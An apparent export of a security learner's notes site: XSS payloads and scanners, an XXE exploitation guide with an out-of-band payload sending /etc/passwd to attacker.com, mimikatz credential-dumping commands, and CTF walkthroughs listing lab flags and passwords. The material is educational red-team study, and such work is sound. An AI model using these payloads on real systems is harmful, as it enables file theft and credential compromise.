github.com/s0md3v/AwesomeXSS\ngithub.com/pgaijin66/XSS-Payloads\n"},"WEB-Exploitation/XSS/XSS-Vulnerability-Scanning-Tools":{"slug":"WEB-Exploitation/XSS/XSS-Vulnerability-Scanning-Tools","filePath":"WEB Exploitation/XSS/XSS Vulnerability Scanning Tools.md","title":"XSS Vulnerability Scanning Tools","links":[],"tags":[],"content":"It is possible to detect or exploit XSS vulnerabilities using automated tools. Many free and paid tools are available for this purpose, some of which are also open source. Below are some of the frequently used tools:\nXSStrike\nXSStrike is an advanced XSS detection tool developed in Python. It features fuzzing, DOM-based XSS detection, and the ability to evade various filters and barriers. XSStrike can scan a URL, test parameters, and automatically perform tests for Reflected and Stored XSS vulnerabilities using XSS attack vectors. Additionally, it can generate payloads to verify the exploitability of the vulnerabilities.\nGitHub Repository: github.com/s0md3v/XSStrike\n\nInstallation:\nXSStrike can be downloaded from GitHub and installed using Python3 and pip:\ngit clone github.com/s0md3v/XSStrike.git\ncd XSStrike\npip3 install -r requirements.txt\nUsage:\nTo run XSStrike, the following command should be used in the terminal:\npython3 xsstrike.py -u &quot;example.com&quot;\nThis command will perform various tests to detect XSS vulnerabilities on the specified URL.\nXSSCon\nXSSCon is a simple and lightweight XSS scanning tool developed in Python. It is run via the command line and is used to test specific URLs for XSS vulnerabilities. The tool analyzes the input fields on the specified URL and identifies potential security risks by sending requests with different parameters.\nGitHub Repository: github.com/menkrep1337/XSSCon\n\nInstallation:\nXSSCon can be downloaded and used from GitHub. Ensure that the Python environment is set up (Python 3 is recommended).\nRequirements:\npip install bs4\npip install requests\nDownload:\ngit clone github.com/menkrep1337/XSSCon.git\nchmod 755 -R XSSCon\ncd XSSCon\npython3 xsscon.py --help \nUsage:\nTo run XSSCon, navigate to the command line and use the following command with the target URL:\npython3 xsscon.py -u &quot;example.com&quot;\nThis command scans the input fields on the specified URL and performs tests for XSS vulnerabilities.\nBeEF (Browser Exploitation Framework)\nBeEF is a security tool that operates on web browsers, often used to exploit XSS vulnerabilities. BeEF can control a user’s browser through a JavaScript code injected into it. This tool allows capturing user browsers via vulnerable sites and performing various security tests through these browsers.\nGitHub Repository: github.com/beefproject/beef\n\nInstallation:\nBeEF is written in Ruby. First, ensure that the Ruby environment is installed. Then, execute the following commands to complete the installation:\ngit clone github.com/beefproject/beef.git\ncd beef\n./install\nUsage:\nAfter starting BeEF, access the web interface at http://localhost:3000/ui/panel and log in as an administrator (default password is ‘beef’). From there, various modules can be used to perform XSS attacks on browsers."},"WEB-Exploitation/XSS/XSS":{"slug":"WEB-Exploitation/XSS/XSS","filePath":"WEB Exploitation/XSS/XSS.md","title":"XSS","links":[],"tags":[],"content":"HTML Tag Injection\nInput tag\nJS can be run using attribute onfocus in a &lt;input&gt; tag. We can then use autofocus tag to automatically run the payload when site is loaded.\nPayload: &quot; onfocus=&quot;alert(0)&quot; autofocus=&quot;\ne.g.\n&lt;input value= &quot;hello&quot; onfocus=&quot;alert(0)&quot; autofocus=&quot;&quot;&gt;\nAnchor tag\nWe can take advantage of href attribute to run js.\nPayload: javascript:alert(0)\ne.g.\n&lt;a href=&quot;javascript:alert(0)&quot;&gt; XSS &lt;/a&gt;\nImage tag\nWe can inject js in onerror attribute.\nPayload: 0&quot; onerror=&quot;alert(0)\ne.g.\n&lt;img src=&quot;0&quot; onerror=&quot;alert(0)&quot;&gt;\nHTTP Header Injection\nUser-Agent Header\nThe User-Agent header contains a string used by a client (usually a web browser) to identify itself to a web server. This information typically includes details about the browser type, operating system, and versions. Servers may use this information for content delivery or compatibility purposes. Attackers can inject JavaScript into this header, and if viewed by the admin panel without filtering, the script is executed upon rendering.\nUser-Agent: Mozilla/5.0 &lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;\nReferer Header\nThe Referer HTTP header indicates the URL of the resource from which the request was initiated. It is often used for analysis, logging, or security purposes. Attackers can inject JavaScript code into this header, which can be executed if viewed by the admin panel without proper sanitization.\nReferer: other-site.com &lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;\nX-Forwarded-For Header\nThe X-Forwarded-For header specifies the original IP address from which a request was made. This header is commonly used by load balancers and proxy servers. Attackers can inject JavaScript into this header, and if viewed without filtering, for instance, by an admin panel, the script can be executed.\nX-Forwarded-For: 198.51.100.15 &lt;script&gt;alert(&#039;XSS&#039;);&lt;/script&gt;"},"WEB-Exploitation/XXE-Exploitaiton":{"slug":"WEB-Exploitation/XXE-Exploitaiton","filePath":"WEB Exploitation/XXE Exploitaiton.md","title":"XXE Exploitaiton","links":["SOC/SOC-Analyst-Notes/XEE-Attack","SOC/SOC-Analyst-Notes/Web-Application-Firewall"],"tags":[],"content":"This note focuses on basic understanding of XEE Exploitation as a red teamer. For better understanding as a defender please refer to XEE Attack.\nXML External Entity (XXE) Vulnerabilities\n\nIntroduction\nWhat is XML?\nXML (Extensible Markup Language) is a markup language used to define structured data readable by both humans and machines. Common uses include web services and data storage.\nExample:\n&lt;user&gt;\n  &lt;name&gt;John&lt;/name&gt;\n  &lt;surname&gt;Doe&lt;/surname&gt;\n&lt;/user&gt;\n\nWhat is a DTD?\nA Document Type Definition (DTD) defines the structure and allowed elements in an XML document. It can be internal or external.\nExample (external DTD):\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;!DOCTYPE library SYSTEM &quot;example.dtd&quot;&gt;\n&lt;library&gt;\n    &lt;book&gt;\n        &lt;title&gt;The Great Gatsby&lt;/title&gt;\n        &lt;author&gt;F. Scott Fitzgerald&lt;/author&gt;\n        &lt;year&gt;1925&lt;/year&gt;\n    &lt;/book&gt;\n&lt;/library&gt;\n\nWhat is an XXE Vulnerability?\nAn XXE (XML External Entity) vulnerability occurs when an XML parser processes external entities. Attackers can:\n\n\nRead local files\n\n\nPerform SSRF\n\n\nCause Denial of Service (DoS)\n\n\nPotentially execute remote code\n\n\nHow it happens: The parser fetches external DTDs and entities, which can contain malicious payloads.\n\nReal-World Examples\n\n\nFile uploads: .docx, .xlsx, .svg, etc.\n\n\nSOAP APIs: XML-based communication endpoints\n\n\nREST APIs: Accepting application/xml payloads\n\n\nSAML Authentication: Poorly configured SAML implementations\n\n\n\nTypes of XXE Attacks\n1. In-band XXE\nData is returned directly in the application’s response.\n&lt;?xml version=&quot;1.0&quot; ?&gt;\n&lt;!DOCTYPE foo [\n  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;\n]&gt;\n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\nMermaid diagram:\ngraph TD\nAttacker[Send malicious XML] --&gt; Server[Processes XML]\nServer --&gt; Response[Returns file content /etc/passwd]\n\n\n2. Out-of-band (OOB) XXE\nData is sent to an attacker-controlled server when the response does not contain the data.\nExample:\n&lt;?xml version=&quot;1.0&quot; ?&gt;\n&lt;!DOCTYPE foo [\n  &lt;!ENTITY % xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;\n  &lt;!ENTITY % dtd SYSTEM &quot;attacker.com/evil.dtd&quot;&gt;\n  %dtd;\n]&gt;\n&lt;foo&gt;&lt;/foo&gt;\nevil.dtd:\n&lt;!ENTITY % data &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#039;attacker.com/%xxe;&#039;&gt;&quot;&gt;\n%data;\nDiagram:\ngraph TD\nServer[Processes XXE] --&gt; HTTP[Requests data to attacker.com]\nAttacker[Receives exfiltrated data]\n\n\n3. Blind XXE\nNo direct data return. Attacker infers information through errors or system behavior.\nExample:\n&lt;?xml version=&quot;1.0&quot; ?&gt;\n&lt;!DOCTYPE foo [\n  &lt;!ENTITY % xxe SYSTEM &quot;file:///nonexistent/file&quot;&gt;\n]&gt;\n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n\n4. Remote Code Execution (RCE) via XXE\nExample in PHP using expect:// wrapper:\n&lt;?xml version=&quot;1.0&quot; ?&gt;\n&lt;!DOCTYPE foo [\n  &lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;\n]&gt;\n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\nPHP vulnerable code:\nlibxml_disable_entity_loader(false);\n$xmlfile = file_get_contents(&#039;php://input&#039;);\n$dom = new DOMDocument();\n$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n$creds = simplexml_import_dom($dom);\n$user = $creds-&gt;user;\necho &quot;Hello &quot; . $user;\n\nExploiting XXE to Retrieve Files\nBasic File Retrieval\n&lt;?xml version=&quot;1.0&quot; ?&gt;\n&lt;!DOCTYPE foo [\n  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;\n]&gt;\n&lt;user&gt;\n  &lt;name&gt;&amp;xxe;&lt;/name&gt;\n&lt;/user&gt;\nDiagram:\ngraph TD\nAttacker[Send XML] --&gt; Server[Reads /etc/passwd]\nServer --&gt; Response[Returns file content]\n\nWindows Example:\n&lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/System32/drivers/etc/hosts&quot;&gt;\nDirectory Listing\n&lt;!ENTITY xxe SYSTEM &quot;file:///etc/&quot;&gt;\n\nExploiting XXE for SSRF\nBasic SSRF Attack\n&lt;?xml version=&quot;1.0&quot; ?&gt;\n&lt;!DOCTYPE foo [\n  &lt;!ENTITY xxe SYSTEM &quot;internal-server.com/admin&quot;&gt;\n]&gt;\n&lt;user&gt;\n  &lt;name&gt;&amp;xxe;&lt;/name&gt;\n&lt;/user&gt;\nDiagram:\ngraph TD\nAttacker[Send XML] --&gt; Server[Server requests internal-server.com]\nServer --&gt; Internal[Access internal server resources]\n\nOut-of-Band SSRF\n&lt;?xml version=&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE foo [\n    &lt;!ENTITY % internal_data SYSTEM &quot;http://internal-api/get_data&quot;&gt;\n    &lt;!ENTITY % dtd SYSTEM &quot;attacker.com/evil.dtd&quot;&gt;\n    %dtd;\n]&gt;\n&lt;foo/&gt;\nevil.dtd:\n&lt;!ENTITY % send_data &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#039;attacker.com/%internal_data;&#039;&gt;&quot;&gt;\n%send_data;\n\nFinding and Testing for XXE\nIdentifying Entry Points\n\n\nFile uploads: .xml, .docx, .xlsx, .svg\n\n\nAPI endpoints: application/xml POST requests\n\n\nRequest bodies containing XML\n\n\n\nManual Testing Techniques\nBasic XXE Test\n&lt;?xml version=&quot;1.0&quot; ?&gt;\n\t&lt;!DOCTYPE foo [\n  &lt;!ENTITY xxe &quot;XXE_TEST&quot;&gt;\n]&gt;\n&lt;user&gt;\n  &lt;name&gt;&amp;xxe;&lt;/name&gt;\n&lt;/user&gt;\nDiagram:\ngraph TD\nSend[Send XXE_TEST] --&gt; Server[Server processes entity]\nServer --&gt; Response[Returns XXE_TEST]\n\nFile Retrieval Test\n&lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot;&gt;\n\nAutomated Tools\n\n\nBurp Suite: Scanner, Repeater, Intruder\n\n\nOWASP ZAP: Automated scanner\n\n\nXXEinjector: XXE-specific tool\n\n\nPayload Lists:\n\n\nPayloadsAllTheThings - XXE Injection\n\n\nPayloadBox - XXE Payload List\n\n\n\nXXE Prevention Methods\nDisable External Entity Processing\nJava: XMLInputFactory\nXMLInputFactory factory = XMLInputFactory.newInstance();\nfactory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);\nfactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);\nJava: DocumentBuilderFactory\nDocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\ndbf.setFeature(&quot;apache.org/xml/features/disallow-doctype-decl&quot;, true);\ndbf.setFeature(&quot;xml.org/sax/features/external-general-entities&quot;, false);\ndbf.setFeature(&quot;xml.org/sax/features/external-parameter-entities&quot;, false);\nPHP\nlibxml_disable_entity_loader(true);\nPython (lxml)\nfrom lxml import etree\nparser = etree.XMLParser(resolve_entities=False)\ntree = etree.parse(xml_file, parser)\n\nInput Validation and Sanitization\n\n\nWhitelist known good values\n\n\nRemove potentially malicious characters or structures\n\n\n\nWeb Application Firewall (WAF)\n\n\nDetect and block known XXE patterns\n\n\nShould be used as an additional layer, not a standalone solution\n\n\n\nSummary Diagram: XXE Attack Flow\ngraph TD\nUser[Send Malicious XML] --&gt; Server[Processes XML with XXE]\nServer --&gt;|File Read| Response[Return Data]\nServer --&gt;|SSRF| Internal[Access Internal Systems]\nAttacker[Receives Data or Observes Effects]\n"},"Web-Attack-Detection/Detecting-Advanced-Web-Attack/index":{"slug":"Web-Attack-Detection/Detecting-Advanced-Web-Attack/index","filePath":"Web Attack Detection/Detecting Advanced Web Attack/index.md","title":"index","links":[],"tags":[],"content":""},"Web-Attack-Detection/Detecting-Insecure-Deserialization-Vulnerabilities/index":{"slug":"Web-Attack-Detection/Detecting-Insecure-Deserialization-Vulnerabilities/index","filePath":"Web Attack Detection/Detecting Insecure Deserialization Vulnerabilities/index.md","title":"index","links":[],"tags":[],"content":""},"Web-Attack-Detection/Detecting-Log4Shell-Attack/index":{"slug":"Web-Attack-Detection/Detecting-Log4Shell-Attack/index","filePath":"Web Attack Detection/Detecting Log4Shell Attack/index.md","title":"index","links":[],"tags":[],"content":""},"Web-Attack-Detection/F5-BIG-IP-iControl-REST-RCE-Detection/index":{"slug":"Web-Attack-Detection/F5-BIG-IP-iControl-REST-RCE-Detection/index","filePath":"Web Attack Detection/F5 BIG-IP iControl REST RCE Detection/index.md","title":"index","links":[],"tags":[],"content":""},"Web-Attack-Detection/Hacked-Web-Server-Analysis/index":{"slug":"Web-Attack-Detection/Hacked-Web-Server-Analysis/index","filePath":"Web Attack Detection/Hacked Web Server Analysis/index.md","title":"index","links":[],"tags":[],"content":""},"Web-Attack-Detection/JWT-Attacks-and-Detection/index":{"slug":"Web-Attack-Detection/JWT-Attacks-and-Detection/index","filePath":"Web Attack Detection/JWT Attacks and Detection/index.md","title":"index","links":[],"tags":[],"content":""},"Web-Attack-Detection/SAML-Vulnerability-and-Detection/index":{"slug":"Web-Attack-Detection/SAML-Vulnerability-and-Detection/index","filePath":"Web Attack Detection/SAML Vulnerability and Detection/index.md","title":"index","links":[],"tags":[],"content":""},"Web-Attack-Detection/Spring4Shell/index":{"slug":"Web-Attack-Detection/Spring4Shell/index","filePath":"Web Attack Detection/Spring4Shell/index.md","title":"index","links":[],"tags":[],"content":""},"Web-Attack-Detection/Text4Shell/index":{"slug":"Web-Attack-Detection/Text4Shell/index","filePath":"Web Attack Detection/Text4Shell/index.md","title":"index","links":[],"tags":[],"content":""},"Web-Attack-Detection/index":{"slug":"Web-Attack-Detection/index","filePath":"Web Attack Detection/index.md","title":"index","links":["SOC/SOC-Analyst-Notes/Web-Attacks","Web-Attack-Detection/Detecting-Advanced-Web-Attack/","Web-Attack-Detection/Hacked-Web-Server-Analysis/","Web-Attack-Detection/Detecting-Log4Shell-Attack/","Web-Attack-Detection/Text4Shell/","Web-Attack-Detection/F5-BIG-IP-iControl-REST-RCE-Detection/","Web-Attack-Detection/JWT-Attacks-and-Detection/","Web-Attack-Detection/SAML-Vulnerability-and-Detection/","Web-Attack-Detection/Detecting-Insecure-Deserialization-Vulnerabilities/","Web-Attack-Detection/Spring4Shell/"],"tags":[],"content":"1. Web Attacks\n2. Detecting Advanced Web Attack\n3. Hacked Web Server Analysis\n4. Detecting Log4Shell Attack\n5. Text4Shell\n6. F5 BIG-IP iControl REST RCE Detection\n7. JWT Attacks and Detection\n8. SAML Vulnerability and Detection\n9. Detecting Insecure Deserialization Vulnerabilities\n10. Spring4Shell"},"Writeups/CTF/Block":{"slug":"Writeups/CTF/Block","filePath":"Writeups/CTF/Block.md","title":"Block","links":[],"tags":[],"content":"\nTHM Medium Room\n\n\nChallenge: tryhackme.com/room/blockroom\n\nEncryption? What encryption?\n\n\n\nBackground\n\nOne of your junior system administrators forgot to deactivate two accounts from a pair of recently fired employees.\nWe believe these employees used the credentials they were given in order to access some of the many private files from our server, but we need concrete proof.\nThe junior system administrator only has a small network capture of the incident and a memory dump of the Local Security Authority Subsystem Service process.\nFortunately, for your company, that is all you need.\n\n\n\nmedium\n\n\n120 min\n\n\nWalkthrough\n1. What is the username of the first person who accessed our server?\n\nThere are only two files in the archive: pcap file and memory dump. Open the pcap file to see authentication packets. Right after opening the file, we see an authentication packet on 11 no. with username right infront of us.\n\n\n→ mrealman\n2. What is the password of the user in question 1?\nWe will have to analyze the lsaas memory dump for this. Lets first understand what lsaas is.\n\nLSASS is a critical component of the Windows operating system, responsible for enforcing security policies, handling authentication, and managing user logins. At the initial login, LSASS performs several key functions:\n\nCaching credentials locally in memory&gt;\nCreating access tokens\nEnforcing security policies\nWriting to the Windows security log\n\nGiven its role, LSASS becomes a prime target for extracting credentials. By creating a memory dump of the LSASS process, we can analyze it offline to extract sensitive information.\n\n\nTo extract credentials we will be using a popular tool called mimikatz. You can download it from here (It will be flagged dangerous and you should be doing all this in a vm). After extracting, run the executable by double clicking it. Following window will appear:\n\nNow run following command (pass full path of dump file):\n\nmimikatz # sekurlsa::minidump C:\\Users\\Beetroot\\Desktop\\lsass.DMP\n\nThen following command. It will give a verbose output with all creds.\n\nmimikatz # sekurlsa::logonPasswords\n\n\n\nWe need password of user: ‘mrealman’. We can use any of the 3 hashes shown. Lets try NTLM hash in an online rainbow table from here. A match was found. If a match was not found we would use hashcat. Keep the output of this for answering question 5.\n\n\n→ Blockbuster1\n3. What is the flag that the first user got access to?\n\nSince we have the pcap file we can see what the user accessed. But the SMB traffic is all encrypted. We need to decrypt it. For this we need to give wireshark the NTLM password which we got from question 2. We need to go to Edit&gt;Preferences&gt;Protocols&gt;NTLMSSP as shown in fig below:\n\nBut the packets are not decrypted yet. It appears that we need to check the Try to decrypt Kerberos blobs in Edit&gt;Preferences&gt;Protocols&gt;KRB5 as shown in fig below:\n\nNow the smb traffic of the user has been decrypted. We can see a files was downloaded from /clients. To download the file we need to go to File&gt;Export Objects&gt;SMB and Click save.\n\nOpening the csv file, we see our flag.\n\n\n→ THM{SmB_DeCrypTing_who_Could_Have_Th0ughT}\n4. What is the username of the second person who accessed our server?\n\nIn the pcap file, when we scroll down, we can see another SMB Session Request in packet no. 82. The username is rigth there.\n\n→ eshellstrop\n5. What is the hash of the user in question 4?\n\nWe can just look for the creds of this user in output we got from mimikatz in question 2. It is probably asking for NTLM hash.\n\n\n→ 3f29138a04aadc19214e9c04028bf381\n6. What is the flag that the second user got access to?\n\nThe hash was not found in lookup tables online so we will use a different technique for this one. It was explained along with other 2 method neatly here.\nFor this method, we will use this script to create keytab file which we will load into wireshark to decrypt the packets. Download the script and open it in editor. We will have to manually add the NTLM hash in the script as shown below.\n\nThen run the script using python and the output file should be generated. We will now pass this file to wireshark in Edit&gt;Preferences&gt;Protocols&gt;KRB5 as shown below:\n\nNow the packets should be decrypted. Now we can go to File&gt;Export Objects&gt;SMB and we should see a new file there.\n\nWe then save the file (\\clients978.csv) and open it. Our flag should be right there.\n\n\n→ THM{No_PasSw0Rd?_No_Pr0bl3m}"},"Writeups/CTF/EncryptedScroll":{"slug":"Writeups/CTF/EncryptedScroll","filePath":"Writeups/CTF/EncryptedScroll.md","title":"EncryptedScroll","links":["Assets/cb2be1a3e6cd0db1431da1075bb84943_MD5.zip"],"tags":[],"content":"\n\nCyber Apocalypse CTF 2025 HTB\n\n\nAttachment:\n\n\ncb2be1a3e6cd0db1431da1075bb84943_MD5.zip\n\n\nReversing\n\n\nBackground\n\nElowen Moonsong, an Elven mage of great wisdom, has discovered an ancient scroll rumored to contain the location of The Dragon’s Heart. However, the scroll is enchanted with an old magical cipher, preventing Elowen from reading it.\n\nSolution\n\n\nUsing DIE to analyze the file, it appears to be a C program for Linux.\n\n\n\nAnalyzing strings, there is only this that makes sense.\n\n\n\nUsing Ghidra to decompile the file. Since its a C program it should be ez.\n\n\nThe main function is simple. Prints the text we saw earlier then takes input and passes it to the decrypt_message() function.\n\n\n\nThe decrypt_message() function appears to be where the input is validated. There is this IUC… string which is ran in a for loop and -1 is subtracted from each character, shifting the ASCII characters to left. This is a simple Ceasar cypher. We can decode it using cesar decoder online.\n\n\n\nThe decoded spell is HTB{s1mpl3_fl4g_4r1thm3t1c}\n\n"},"Writeups/CTF/EscapeTwo":{"slug":"Writeups/CTF/EscapeTwo","filePath":"Writeups/CTF/EscapeTwo.md","title":"EscapeTwo","links":[],"tags":[],"content":"Machine Info:\n- Easy\n- Windows\n- IP: 10.129.240.7\n- Incomplete\n\nSteps\n1. Reconnainsce\nNmap Scan\nCommand\nnmap -sV -oA EasyTwo-nmap 10.129.240.7 --open\nResult\nPORT     STATE SERVICE               VERSION\n53/tcp   open  domain                Simple DNS Plus\n88/tcp   open  kerberos-sec          Microsoft Windows Kerberos (server time: 2025-01-12 08:20:02Z)\n135/tcp  open  msrpc                 Microsoft Windows RPC\n139/tcp  open  netbios-ssn           Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http            Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap              Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n1433/tcp open  ms-sql-s              Microsoft SQL Server 2019 15.00.2000\n3269/tcp open  ssl/globalcatLDAPssl?\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows"},"Writeups/CTF/Impossimaze":{"slug":"Writeups/CTF/Impossimaze","filePath":"Writeups/CTF/Impossimaze.md","title":"Impossimaze","links":["Assets/0578cfa9ab216d7a5e18051b47bb92e7_MD5.zip"],"tags":[],"content":"\n\nCyber Apocalypse CTF 2025 HTB\n\n\nAttachment: Open: rev_impossimaze.zip\n\n\n0578cfa9ab216d7a5e18051b47bb92e7_MD5.zip\n\n\nReversing\n\n\nBackground\n\nElowen has been cursed to roam forever in an inescapable maze. You need to break her curse and set her free.\n\nSolution\n\n\nUsing DIE, it appears this is a Compiled C Program for Linux.\n\n\n\nThere are no strings to be found as expected.\n\n\nWe will need a linux environment to solve this.\n\n\nRunning the program, this appear where we can control X.\n\n\n"},"Writeups/CTF/Loggy":{"slug":"Writeups/CTF/Loggy","filePath":"Writeups/CTF/Loggy.md","title":"Loggy","links":[],"tags":[],"content":"HTB Easy Sherlock\n\nChallenge: app.hackthebox.com/sherlocks/Loggy\nAttachments:\n\nURL:challenges-cdn.hackthebox.com/sherlocks/easy/Loggy.zip\nPassword: hacktheblue\n\n\nBackground:\n\nJanice from accounting is beside herself! She was contacted by the SOC to tell her that her work credentials were found on the dark web by the threat intel team. We managed to recover some files from her machine and sent them to the our REM analyst.\n\n\n\nWalkthrough\nThis Sherlock is pretty easy. We don’t need to go too deep into the malware to answer the questions. We will use a VM (im using Flare VM). Download and extract the zip file using the given password. It contains few files and another zip file. The password for this zip file is in danger.txt. Use it to extract the zip file and there will be a .exe file we are supposed to analyze.\n\n\nAfter extracting all of the files, we can use Hash my files tool to find the SHA-256 hash of the binary.\n\n\nLets use DIE (Detect it easy) tool to analyze the .exe file. We can see that the file is PE64 executable and the language it was written in was GO and the exact version number too.\n\n\n\nThe next question asks us for github repo used for data exfiltration. We we have to filter out all of “github” strings from the binary and analyze them. We can use strings tool for windows to do this.\n\n\n\nWe can now go through the repos and see if any suspicious repo is present. We can see that a repo related to ftp is referenced. This is probably the one used for data exfiltration.\n\n\nThere is other repo about screenshot. This probably means that the malware takes screenshot of the device. This also answers our question.\n\n\nLets decompile the malware to reveal further details about it. We can use Ghidra to do this. Opening the executable in Code Browser in Ghidra,\n\n\nWe will let the ghidra decompile the binary. In the meantime, the next question asks which function call suggests a file is written to disk. Lets look at the imports of the executable. It only imports KERNEL32.dll. Looking at the functions in the dll we find that writefile function is imported. This must be the answer.\n\n\n\nNow, we are asked what is the ftp domain and hacker’s creds. Looking through the decompiled code, at the end, inside a while(true) loop, it calls sendFilesViaFTP function.\n\n\n\nLooking inside the function, there is the domain and login creds sitting there for us.\n\n\n\n\nTo find which file is being written lets look at file handling function in the code. There’s a openfile() being called in line 117 few lines after the creds were initialized. Looking at the assembly code we can see the filename commented by Ghidra. \n\n\nThe next question is asking us to look at the log and find what was the changed password. Looking at the log.txt file, it has keycodes and stuff. Looking closely we can see some letters and the username and password is just there.\n\n\nAnd the last question can be answered by just looking at the given images.\n\n\nSolution\n\n\nWhat is the SHA-256 hash of this malware binary?\n= 6acd8a362def62034cbd011e6632ba5120196e2011c83dc6045fcb28b590457c\n\n\nWhat programming language (and version) is this malware written in?\n= golang 1.22.3\n\n\nThere are multiple GitHub repos referenced in the static strings. Which GitHub repo would be most likely suggest the ability of this malware to exfiltrate data?\n= github.com/jlaffaye/ftp\n\n\nWhat dependency, expressed as a GitHub repo, supports Janice’s assertion that she thought she downloaded something that can just take screenshots?\n= github.com/kbinani/screenshot\n\n\nWhich function call suggests that the malware produces a file after execution?\n= writefile\n\n\nYou observe that the malware is exfiltrating data over FTP. What is the domain it is exfiltrating data to?\n= gotthem.htb\n\n\nWhat are the threat actor’s credentials?\n= NottaHacker:Cle@rtextP@ssword\n\n\nWhat file keeps getting written to disk?\n= keylog.txt\n\n\nWhen Janice changed her password, this was captured in a file. What is Janice’s username and password?\n= janice:Password123\n\n\nWhat app did Janice have open the last time she ran the “screenshot app”?\n= Solitaire\n\n"},"Writeups/CTF/Memory-Forensics":{"slug":"Writeups/CTF/Memory-Forensics","filePath":"Writeups/CTF/Memory Forensics.md","title":"Memory Forensics","links":[],"tags":[],"content":"THM Easy Room\n\nChallenge: tryhackme.com/room/memoryforensics\nBackground:\n\nPerform memory forensics to find the flags\n\n\neasy\n45 min\n\nWalkthrough\nWe will need volatility3 to analyze the memory dump. Click the link to go to its github repo and install it from there. Looking at its documentation might also help.\nTask 2: Login\n\nThe forensic investigator on-site has performed the initial forensic analysis of John’s computer and handed you the memory dump he generated on the computer. As the secondary forensic investigator, it is up to you to find all the required information in the memory dump.\n\n\nWhat is John’s password?\n\n\nFor extracting password, we need to use windows.hashdump plugin in volatility3 to list hashes first.\nThe exact command is:\n\n volatility3\\vol.py -f Desktop\\Snapshot6_1609157562389.vmem windows.hashdump\n\nWe get following output:\n\nWe can see the NTLM hash of user John. We need to get the password from hash now. We can try online rainbow tables first then bruteforce using hashcat. Trying in hashes.com/en/decrypt/hash, we find a match.\n\n\n→ charmander999\nTask 3: Analysis\n\nOn arrival a picture was taken of the suspect’s machine, on it, you could see that John had a command prompt window open. The picture wasn’t very clear, sadly, and you could not see what John was doing in the command prompt window.\nTo complete your forensic timeline, you should also have a look at what other information you can find, when was the last time John turned off his computer?\n\n\nWhen was the machine last shutdown?\n\n\nWe need to determine the profile first using following command.\n\nvolatility.exe -f Snapshot19_1609159453792.vmem imageinfo\n\nIt returns output something like this with suggested profiles:\n\nNow we can use the suggested profile and extract the last shutdown time using following command:\n\nvolatility.exe -f Snapshot19_1609159453792.vmem shutdowntime --profile Win7SP1x64\n\nIt returns following output:\n\n\n→ 2020-12-27 22:50:12\n\n\nWhat did John write?\n\nWe know John wrote something in console so we can simply look at console history using following command\n\n\n\nvolatility.exe -f Snapshot19_1609159453792.vmem consoles --profile Win7SP1x64\n\nIt returns cmd prompt history which looks like as shown below. There is our answer hidden among these commands.\n\n\n→ You_found_me\nTask 4: TrueCrypt\n\nA common task of forensic investigators is looking for hidden partitions and encrypted files, as suspicion arose when TrueCrypt was found on the suspect’s machine and an encrypted partition was found. The interrogation did not yield any success in getting the passphrase from the suspect, however, it may be present in the memory dump obtained from the suspect’s computer.\n\n\n\nWhat is the TrueCrypt passphrase?\n\nLets get the profiles first.\n\n\n\nC:\\Users\\Beetroot\\Desktop&gt;volatility.exe -f Snapshot6_1609157562389.vmem imageinfo\n\nIt returns following output which has suggested profiles\n\nNow we can use the truecryptpassphrase command to extract the truecrypt passphrase. The complete command is:\n\nvolatility.exe -f Snapshot14_1609164553061.vmem truecryptpassphrase --profile Win7SP1x64\n→ forgetmenot"},"Writeups/CTF/Nibbles":{"slug":"Writeups/CTF/Nibbles","filePath":"Writeups/CTF/Nibbles.md","title":"Nibbles","links":["'app.hackthebox.com'","HTB/Nmap","HTB/ssh","HTB/Banner-grabbing","HTB/Gobuster","HTB/Metasploit","HTB/Reverse-Shell"],"tags":[],"content":"This is a retired machine, part of Getting Started Module of Hack The Box\nSteps Taken\nReconnaissance\nNmap Scan\nCommand\nnmap -sV -oA 01-04-2025-11-44-Nibbles-nmap 10.129.207.130 --open\nResult\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n \nConclusion\nThe host is running a apache server and is hosting a website and also has a ssh enabled and listening.\nBanner grabbing\nNo fruitful result obtained, got the same header as in nmap scan.\nVisiting the webpage\nThere is an interesting comment\n&lt;!--- /nibbleblog/ directory. Nothing interesting here! ---&gt;\nThere is nothing else on the webpage.\nGoing to the /nibbleblog directory\nThe website seems to be hosting a blog. We can note:\n\nThe blog seems to be ran using nibbleblog.\nThe website is using php.\nNothing else is there on the site\n\nEnumerating directories\nSince nothing much of our interest can be found I will enumerate directories using Gobuster. Couldn’t find anything with common.txt so using few other dictionaries to scan.\nMistake: Was enumerating the root url when I was supposed to enumerate the /nibbleblog. Found out after trying few wordlists and not finding any directories.\nCommand\ngobuster dir -u 10.129.207.130/nibbleblog -w /usr/share/wordlists/dirb/common.txt\nOutput\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.hta                 (Status: 403) [Size: 304]\n/.htaccess            (Status: 403) [Size: 309]\n/.htpasswd     